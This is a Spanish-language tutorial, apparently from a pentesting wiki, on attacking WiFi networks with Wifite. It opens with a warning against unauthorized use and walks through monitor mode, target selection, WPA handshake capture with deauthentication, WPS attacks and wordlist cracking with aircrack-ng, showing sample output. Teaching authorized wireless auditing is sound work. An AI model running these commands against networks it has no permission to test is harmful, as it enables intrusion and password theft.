
# Wifite

Wifite es una herramienta automatizada para ataques a redes inalámbricas. Se usa para realizar pruebas de penetración en redes WiFi mediante ataques como **WEP, WPA, WPA2 y WPS**.

<figure><img src="/files/66u7AEfooBd5zsaFPcGo" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
**Usar Wifite en redes sin autorización es ilegal** en la mayoría de los países. Esta herramienta debe utilizarse **únicamente en auditorías de seguridad y con permiso explícito del propietario de la red**.
{% endhint %}

***

## <mark style="color:purple;">Instalación</mark>

Wifite viene preinstalado en Kali Linux, pero si no lo tienes, puedes instalarlo con:

```bash
sudo apt update && sudo apt install wifite -y
```

Verifica que está instalado ejecutando:

```bash
wifite --help
```

***

## <mark style="color:purple;">P</mark><mark style="color:purple;">**oner la tarjeta de red en modo monitor**</mark>

Antes de ejecutar Wifite, debes activar el modo monitor en tu tarjeta de red WiFi:

```bash
sudo airmon-ng check kill  # Cierra procesos que interfieren
sudo airmon-ng start wlan0 # Activa el modo monitor en wlan0
```

Reemplaza **wlan0** por la interfaz correcta que puedes encontrar con:

```bash
iwconfig
```

Después, usa el nombre de la interfaz en modo monitor, por ejemplo, **wlan0mon**.

***

## <mark style="color:purple;">E</mark><mark style="color:purple;">**jecutar Wifite**</mark>

Para iniciar Wifite y escanear redes cercanas:

```bash
sudo wifite --kill
```

Esto escaneará todas las redes WiFi disponibles y te pedirá seleccionar el objetivo.

<figure><img src="/files/66u7AEfooBd5zsaFPcGo" alt=""><figcaption></figcaption></figure>

Seleccionamos la red objetivo, en nuestro caso la red `6`: INHACKEABLE

```shell-session
[+] Select target(s) (1-17) separated by commas, dashes or all: 6                                                                                                     

 [+] (1/1) Starting attacks against EA:66:AB:XX:XX:XXA (INHACKEABLE)
 [+] INHACKEABLE (44db) PMKID CAPTURE: Failed to capture PMKID   
 
 [+] INHACKEABLE (54db) WPA Handshake capture: Discovered new client: 90:B7:90:XX:XX:XX                                                                                
 [+] INHACKEABLE (54db) WPA Handshake capture: Discovered new client: 96:A0:32:XX:XX:XX                                                                                
 [+] INHACKEABLE (51db) WPA Handshake capture: Listening. (clients:2, deauth:7s, timeout:2m6s)
```

Una vez que encuentre el handshake lo crackeará automáticamente y obtendremos la contraseña en plano.

🔹 Para escanear y atacar redes WPA/WPA2 automáticamente:

```bash
sudo wifite --wps --wpa
```

🔹 Para enfocarse en una red específica:

```bash
sudo wifite -i wlan0mon --bssid XX:XX:XX:XX:XX:XX
```

(Reemplaza **XX:XX:XX:XX:XX:XX** con la dirección MAC de la red objetivo).

***

## <mark style="color:purple;">**Métodos de ataque disponibles**</mark>

Tenemos `3 tipos de ataques` que podemos realizar con Wifite:

* **Ataque WPA/WPA2:** Captura el handshake para crackearlo con diccionario.
* **Ataque WEP:** Intenta ataques de inyección de paquetes.
* **Ataque WPS (WPS Pixie-Dust o Reaver):** Ataca routers con WPS activado.

Ejemplo de ataque a WPA/WPA2:

```bash
sudo wifite --wpa --dict /ruta/diccionario.txt
```

***

## <mark style="color:purple;">A</mark><mark style="color:purple;">**nálisis de Handshake capturado**</mark>

Si se captura un handshake, usa **Aircrack-ng** para intentar descifrarlo:

```bash
aircrack-ng -w /ruta/diccionario.txt -b XX:XX:XX:XX:XX:XX captura.cap
```
